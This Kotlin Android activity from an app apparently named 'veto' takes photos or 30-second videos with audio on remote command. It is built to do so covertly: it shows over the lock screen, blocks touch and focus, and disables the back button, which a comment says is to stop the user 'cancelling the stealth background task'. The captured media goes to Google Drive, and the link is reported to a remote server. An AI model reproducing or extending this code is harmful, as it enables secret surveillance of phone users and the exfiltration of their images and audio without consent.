
package com.neubofy.veto.ui

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Size
import android.view.Surface
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.core.resolutionselector.ResolutionSelector
import androidx.camera.core.resolutionselector.ResolutionStrategy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.concurrent.futures.await
import androidx.core.content.ContextCompat
import androidx.core.view.isVisible
import androidx.lifecycle.lifecycleScope
import com.neubofy.veto.databinding.ActivityDummyCameraxBinding
import com.neubofy.veto.utils.CypherUtils
import com.neubofy.veto.utils.imageToByteArray
import com.neubofy.veto.utils.log
import kotlinx.coroutines.launch
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


class DummyCameraxActivity : AppCompatActivity() {

    private lateinit var viewBinding: ActivityDummyCameraxBinding
    private lateinit var cameraExecutor: ExecutorService
    private var cameraExtra: Int = CAMERA_BACK
    private var shouldFlash: Boolean = false
    private var hasStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!hasCameraPermission()) {
            this.log().w(TAG, "Camera permission is missing. Not taking picture.")
            finish()
        }
        viewBinding = ActivityDummyCameraxBinding.inflate(layoutInflater)
        setContentView(viewBinding.root)

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
            // On SDK >= 27 we have the flags in the AndroidManifest
            @Suppress("Deprecation")
            window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
        }

        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        )

        onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Do nothing to prevent user from cancelling the stealth background task
            }
        })

        cameraExecutor = Executors.newSingleThreadExecutor()
    }

    override fun onResume() {
        super.onResume()
        if (hasStarted) return
        hasStarted = true
        cameraExtra = intent.extras?.getInt(EXTRA_CAMERA) ?: CAMERA_BACK
        shouldFlash = intent.extras?.getBoolean(EXTRA_FLASH) ?: false

        lifecycleScope.launch {
            val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"
            if (commandName == "video") {
                recordVideo()
            } else {
                takePhoto()
            }
        }
    }

    override fun onNewIntent(intent: android.content.Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraExecutor.shutdown()
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            baseContext, Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED
    }

    private suspend fun takePhoto() {
        val flashMode = if (shouldFlash && cameraExtra == CAMERA_BACK) {
            ImageCapture.FLASH_MODE_ON
        } else if (shouldFlash && cameraExtra == CAMERA_FRONT) {
            ImageCapture.FLASH_MODE_SCREEN
        } else {
            ImageCapture.FLASH_MODE_OFF
        }

        val cameraProvider = ProcessCameraProvider.getInstance(this).await()
        val builder = ImageCapture.Builder()
            .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
            .setFlashMode(flashMode)
            .setTargetRotation(Surface.ROTATION_0)
            // Set the resolution to 720 x 1280, aka "720p" (flipped because it is in portrait).
            // Or lower, if this resolution is not available.
            // This should be large enough for most use cases.
            // By default CameraX uses the highest resolution, but then the images are large, making the upload slow.
            .setResolutionSelector(
                ResolutionSelector.Builder().setResolutionStrategy(
                    ResolutionStrategy(
                        Size(720, 1280),
                        ResolutionStrategy.FALLBACK_RULE_CLOSEST_LOWER_THEN_HIGHER
                    )
                ).build()
            )

        if (shouldFlash && cameraExtra == CAMERA_FRONT) {
            // https://android-developers.googleblog.com/2024/12/whats-new-in-camerax-140-and-jetpack-compose-support.html
            viewBinding.screenFlashView.isVisible = true
            viewBinding.screenFlashView.setScreenFlashWindow(this.window)
            viewBinding.screenFlashView.screenFlash?.let {
                builder.setScreenFlash(it)
            }
        }

        val imageCapture = builder.build()

        val cameraSelector =
            if (cameraExtra == CAMERA_FRONT) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

        cameraProvider.unbindAll()
        try {
            cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture)
            // Wait for the camera hardware to physically turn on and open the session
            // Otherwise, takePicture throws ImageCaptureException ERROR_CAMERA_CLOSED (3)
            kotlinx.coroutines.delay(1500L)
        } catch (e: IllegalArgumentException) {
            e.printStackTrace()
            this.log().e(
                TAG,
                "Cannot take picture: bindToLifecycle failed, see the stacktrace. message=${e.message} cause=${e.cause}"
            )
            val transport = com.neubofy.veto.transports.NextJsServerTransport(applicationContext)
            transport.send(applicationContext, "Photo capture failed: bindToLifecycle error", intent.extras?.getString(EXTRA_COMMAND) ?: "camera")
            finish()
            return
        }

        imageCapture.takePicture(
            cameraExecutor,
            object : ImageCapture.OnImageCapturedCallback() {
                @androidx.annotation.OptIn(androidx.camera.core.ExperimentalGetImage::class)
                override fun onCaptureSuccess(image: ImageProxy) {
                    super.onCaptureSuccess(image)
                    val img = image.image
                    if (img == null) {
                        applicationContext.log().w(TAG, "Captured image was null!")
                        finish()
                        return
                    }
                    val imgBytes = imageToByteArray(img)
                    uploadPhotoAndFinish(imgBytes)
                }

                override fun onError(exception: ImageCaptureException) {
                    super.onError(exception)
                    applicationContext.log()
                        .w(TAG, "Failed to take picture: ${exception.imageCaptureError}")
                    val transport = com.neubofy.veto.transports.NextJsServerTransport(applicationContext)
                    transport.send(applicationContext, "Photo capture failed: ${exception.imageCaptureError}", intent.extras?.getString(EXTRA_COMMAND) ?: "camera")
                    finish()
                }
            })
    }

    private fun uploadPhotoAndFinish(imgBytes: ByteArray) {
        val ctx = applicationContext
        
        // Write the bytes to a temporary file
        val tempFile = java.io.File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
        tempFile.writeBytes(imgBytes)

        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "camera"

        // Finish immediately — camera hardware released, upload continues in background thread
        finish()

        com.neubofy.veto.utils.GoogleDriveUploader.uploadFile(
            context = ctx,
            file = tempFile,
            mimeType = "image/jpeg",
            type = "photo",
            onSuccess = { link ->
                tempFile.delete()
                val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                transport.send(ctx, "Photo Captured: $link", commandName)
            },
            onError = { error ->
                tempFile.delete()
                ctx.log().e(TAG, "Failed to upload photo to Drive: $error")
                val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                transport.send(ctx, "Failed to upload photo to Drive: $error", commandName)
            }
        )
    }

    private suspend fun recordVideo() {
        val cameraProvider = ProcessCameraProvider.getInstance(this).await()

        val qualitySelector = androidx.camera.video.QualitySelector.from(
            androidx.camera.video.Quality.SD,
            androidx.camera.video.FallbackStrategy.lowerQualityOrHigherThan(androidx.camera.video.Quality.SD)
        )
        val recorder = androidx.camera.video.Recorder.Builder()
            .setExecutor(cameraExecutor)
            .setQualitySelector(qualitySelector)
            .build()
        val videoCapture = androidx.camera.video.VideoCapture.withOutput(recorder)

        val cameraSelector =
            if (cameraExtra == CAMERA_FRONT) CameraSelector.DEFAULT_FRONT_CAMERA else CameraSelector.DEFAULT_BACK_CAMERA

        cameraProvider.unbindAll()
        try {
            cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture)
            kotlinx.coroutines.delay(1500L)
        } catch (e: Exception) {
            this.log().e(TAG, "Cannot record video: bindToLifecycle failed. ${e.message}")
            val transport = com.neubofy.veto.transports.NextJsServerTransport(applicationContext)
            transport.send(applicationContext, "Video recording failed: bindToLifecycle error", intent.extras?.getString(EXTRA_COMMAND) ?: "video")
            finish()
            return
        }

        val videoFile = java.io.File(cacheDir, "video_${System.currentTimeMillis()}.mp4")
        val outputOptions = androidx.camera.video.FileOutputOptions.Builder(videoFile).build()

        val ctx = applicationContext
        val pendingRecording = recorder.prepareRecording(this, outputOptions)

        @Suppress("MissingPermission")
        val recording = pendingRecording.withAudioEnabled().start(ContextCompat.getMainExecutor(this)) { event ->
            if (event is androidx.camera.video.VideoRecordEvent.Finalize) {
                if (!event.hasError()) {
                    uploadVideoAndFinish(videoFile)
                } else {
                    ctx.log().e(TAG, "Video capture failed: ${event.error}")
                    videoFile.delete()
                    finish()
                }
            }
        }

        kotlinx.coroutines.delay(30000L)
        recording.stop()
    }

    private fun uploadVideoAndFinish(tempFile: java.io.File) {
        val ctx = applicationContext
        val commandName = intent.getStringExtra(EXTRA_COMMAND) ?: "video"

        // Finish immediately — camera released, upload continues in background thread
        finish()

        com.neubofy.veto.utils.GoogleDriveUploader.uploadFile(
            context = ctx,
            file = tempFile,
            mimeType = "video/mp4",
            type = "video",
            onSuccess = { link ->
                tempFile.delete()
                val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                transport.send(ctx, "Video Captured: $link", commandName)
            },
            onError = { error ->
                tempFile.delete()
                ctx.log().e(TAG, "Failed to upload video to Drive: $error")
                val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                transport.send(ctx, "Failed to upload video to Drive: $error", commandName)
            }
        )
    }

    companion object {
        val TAG = DummyCameraxActivity::class.simpleName

        const val EXTRA_COMMAND = "EXTRA_COMMAND"
        const val EXTRA_CAMERA = "EXTRA_CAMERA"
        const val EXTRA_FLASH = "EXTRA_FLASH"
        const val CAMERA_BACK = 0
        const val CAMERA_FRONT = 1
    }
}
